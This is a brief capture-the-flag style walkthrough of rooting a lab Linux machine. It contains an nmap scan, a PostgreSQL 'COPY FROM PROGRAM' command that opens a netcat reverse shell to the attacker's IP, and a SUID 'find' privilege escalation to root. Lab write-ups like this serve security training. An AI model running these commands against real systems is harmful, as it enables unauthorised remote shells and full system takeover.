First we start with an nmap scan 

`nmap -sC -sV -T4 -oN nmap.txt <IP> -p-` 

```
# Nmap 7.93 scan initiated Mon Dec 26 08:46:39 2022 as: nmap -sC -sV -T4 -oN fullmap.txt -Pn -p- -v 192.168.108.47
Nmap scan report for 192.168.108.47
Host is up (0.19s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10621ff522de29d42496a766c364b710 (RSA)
|_  256 907ca34473b4b44ce39c71d187baca7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-27T15:41:47
| Not valid after:  2030-04-25T15:41:47
| MD5:   b0866d304913684e16c18348fc76fe43
|_SHA-1: cb3051090fc114ab0fb98e5558744bb5ba5766af
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 26 08:56:46 2022 -- 1 IP address (1 host up) scanned in 606.52 seconds
```

Got ftp,ssh,http& postgresql service. checked port 80 was nothing so i checked port 5437 which is running postgresql. Logged in as user postgres and tried to spawn a shell from it.

```
psql -h 192.168.145.47 -U postgres -p 5437
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'nc -c sh 192.168.49.145 80';
```

![image](https://user-images.githubusercontent.com/87468669/209588689-22422425-5e1a-45bb-aea6-47ba6f4de438.png)

Boom!!! Got in... Stabilize the shell

![image](https://user-images.githubusercontent.com/87468669/209588761-abd9461f-e6f4-4a9b-93dd-a3c28e181405.png)

Checked for suid bin files, find is vulnerable so hit gtfobin `./find . -exec /bin/sh -p \; -quit`

![image](https://user-images.githubusercontent.com/87468669/209588914-2574d3b0-5ec8-4094-bf7a-02f87a4f3e5f.png)

Rooted!!!🤠🤠

![image](https://user-images.githubusercontent.com/87468669/209588943-90f2a166-0314-47ec-91f5-0819c2672e53.png)




